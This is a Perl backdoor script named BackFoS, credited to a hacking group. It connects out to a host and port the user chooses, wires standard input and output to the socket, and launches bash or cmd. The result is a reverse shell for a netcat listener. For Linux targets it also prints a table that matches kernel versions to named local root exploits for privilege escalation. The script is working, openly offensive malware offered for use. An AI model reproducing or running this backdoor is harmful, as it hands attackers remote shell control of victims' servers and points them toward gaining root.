#!/usr/bin/perl

########### BackFoS v0.3 - By FoS TeaM - [priv8] ##########
#                                                         #
#     BackFoS is a Backdoor in PERL for  All  Servers     #
#            c0dex by Vengador de las Sombras             #
#                                                         #
#          USAGE: Perl BackFoS.pl <HOST> <PORT> <OS>      #
#     You need have listen nc, cryptcar, putty or other   #
#      program on <PORT> to connect with the backdoor     #
#                                                         #
#=========================================================#
#                                                         #
#  Gr3tz to: Lutscher, WaesWaes, CHR0N05, Keynet, Fr34k,  #       
# Lëssiëm Tárálom, Phonix & ArgeniversoHack & #RE members #
#      Especial Thanx To Plaga, for the help =)           #
#                                                         #
#################### (c)FoS TeaM 2008 #####################

use IO::Socket;

print q(

=================================================
   BackFoS.pl c0dex by FoS TeaM
=================================================
);
$ARGC = @ARGV;
if ($ARGC != 3){ 
print "\nUsage: BackFoS.pl <HOST> <PORT> <OS>";
exit(0);
}

$host = $ARGV[0];
$port = $ARGV[1];
$OS = $ARGV[2];
use Socket;

print "[+]Connecting to $host ...";
socket(SOCKET, PF_INET, SOCK_STREAM, getprotobyname('tcp'))
                                                     || die "[-] Cannot Resolve $host";
connect(SOCKET, sockaddr_in($port, inet_aton($host)))
                                                     || die "[-] Cannot Connect to $host";

print "\n[+] Connected!";

open(STDIN, ">&SOCKET");
open(STDOUT,">&SOCKET");
open(STDERR,">&SOCKET");

print "\n .::BackFoS v0.3::. - FoS TeaM - [Priv8]\n\n";
if ($OS == "-l"){
$kv = "uname -r";
chomp($kv);
print "Kernel Version: $kv\n\n";
%lista=(
2.4.17=> "newlocal kmod uselib24",
2.4.18=> "brk brk2 newlocal kmod",
2.4.19=> "brk brk2 newlocal kmod",
2.4.20=> "ptrace kmod ptrace-kmod brk brk2",
2.4.21=> "brk brk2 ptrace ptrace-kmod",
2.4.22=> "brk brk2 ptrace ptrace-kmod",
2.4.22-10=> "loginx",
2.4.23=> "mremap_pte",
2.4.24=> "mremap_pte uselib24",
2.4.25-1=> "uselib24",
2.4.27=> "uselib24",
2.6.2=> "mremap_pte krad h00lyshit",
2.6.5=> "krad krad2 h00lyshit",
2.6.6=> "krad krad2 h00lyshit",
2.6.7=> "krad krad2 h00lyshit",
2.6.8=> "krad krad2 h00lyshit",
2.6.8-5=> "krad2  h00lyshit",
2.6.9=> "krad  krad2  h00lyshit",
2.6.9-34=> "r00t h00lyshit",
);

foreach $v (keys %lista) {
if ($kv =~ /$v/){
print "\n RootExploits: $lista{$v}\n";
}
}

$ejecutor = "/bin/bash";
system($ejecutor);
}

if ($OS == "-w"){
$ejecutor = "cmd";
system($ejecutor);
}
